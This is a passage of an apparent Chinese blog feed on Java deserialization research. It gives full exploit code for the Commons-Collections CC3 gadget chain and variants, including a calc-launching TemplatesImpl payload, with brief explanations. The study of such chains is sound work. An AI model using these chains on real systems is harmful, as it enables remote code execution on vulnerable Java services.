class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderTest</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>![](\images\posts\Commons-Collection CC3链\1726471489931.jpg)</p><p>CC1可以执行任意方法，通过CC1调用<code>TemplatesImpl</code>的<code>newTransformer</code>方法</p><h2 id="最终的EXP"><a href="#最终的EXP" class="headerlink" title="最终的EXP:"></a>最终的EXP:</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC3</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> c <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> nameField <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> bytecodeField <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodeField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D:\\桌面\\note\\ClassLoaderTest.class\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        bytecodeField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        Field tfactoryField = c.getDeclaredField("_tfactory");</span><span class="token comment">//       tfactoryField.setAccessible(true);</span><span class="token comment">//        tfactoryField.set(templates,new TransformerFactoryImpl());</span><span class="token comment">//</span><span class="token comment">//        templates.newTransformer();</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"admin123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> transformedMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Class</span> tc <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> annotationInvocationHandlerConstructor <span class="token operator">=</span> tc<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"CCTest1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"CCTest1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>![](\images\posts\Commons-Collection CC3链\1726472172428.jpg)</p><h1 id="另一条条链子"><a href="#另一条条链子" class="headerlink" title="另一条条链子"></a>另一条条链子</h1><p>xxxxxxxxxx package org.example;​import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;​public class CC2 {    public static void main(String[] args) throws Exception{        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(“_name”);        nameField.setAccessible(true);        nameField.set(templates,”admin”);​        Field bytecodeField &#x3D; c.getDeclaredField(“_bytecodes”);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(“D:\桌面\note\ClassLoaderTest.class\“));        byte[][] codes &#x3D; {code};        bytecodeField.set(templates,codes);​        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer&lt;&gt;(“newTransformer”, new Class[]{}, new Object[]{});​​        TransformingComparator transformingComparator &#x3D; new TransformingComparator(new ConstantTransformer&lt;&gt;(1));        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);​        priorityQueue.add(templates);        priorityQueue.add(2);​        Class transformingComparatorClass &#x3D; transformingComparator.getClass();        Field declaredField &#x3D; transformingComparatorClass.getDeclaredField(“transformer”);        declaredField.setAccessible(true);        declaredField.set(transformingComparator,invokerTransformer);​​        serialize(priorityQueue);&#x2F;&#x2F;        unserialize(“CCTest1.txt”);​    }    public static void serialize(Object obj) throws IOException {        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(“CCTest1.txt”));        oos.writeObject(obj);    }​    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));        Object obj &#x3D; ois.readObject();        return obj;    }}Java</p><p>![](\images\posts\Commons-Collection CC3链\1726474429642.jpg)</p><p>这里找到了<code>TrAXFilter</code>类，并且调用了<code>newTransformer</code>方法，但是<code>TrAXFilter</code>不能序列化，只有找一个能被序列化的对象来调用这个构造器。这里找到了<code>InstantiateTransformer</code>的<code>transform</code>方法</p><p>![](\images\posts\Commons-Collection CC3链\1726474863076.jpg)</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC3</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> c <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> nameField <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> bytecodeField <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodeField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D:\\桌面\\note\\ClassLoaderTest.class\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        bytecodeField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        Field tfactoryField = c.getDeclaredField("_tfactory");</span><span class="token comment">//        tfactoryField.setAccessible(true);</span><span class="token comment">//        tfactoryField.set(templates,new TransformerFactoryImpl());</span>        <span class="token class-name">InstantiateTransformer</span> instantiateTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        instantiateTransformer.transform(TrAXFilter.class);  //TrAXFilter不能序列化但是class可以序列化</span><span class="token comment">//</span><span class="token comment">//        templates.newTransformer();</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                instantiateTransformer        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"admin123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> transformedMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> tc <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> annotationInvocationHandlerConstructor <span class="token operator">=</span> tc<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"CCTest1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"CCTest1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collection CC1链</title>
      <link href="/2024/11/11/2024-09-16-Commons-Collection%20CC1%E9%93%BE/"/>
      <url>/2024/11/11/2024-09-16-Commons-Collection%20CC1%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="链分析"><a href="#链分析" class="headerlink" title="链分析"></a>链分析</h1><p>入口点是transformer接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Transformer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>查找实现类，找到InvokerTransformer类重写了transform方法，反射接收对象反射调用，方法名，参数类型参数值等都可以控制</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token class-name">String</span> methodName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> 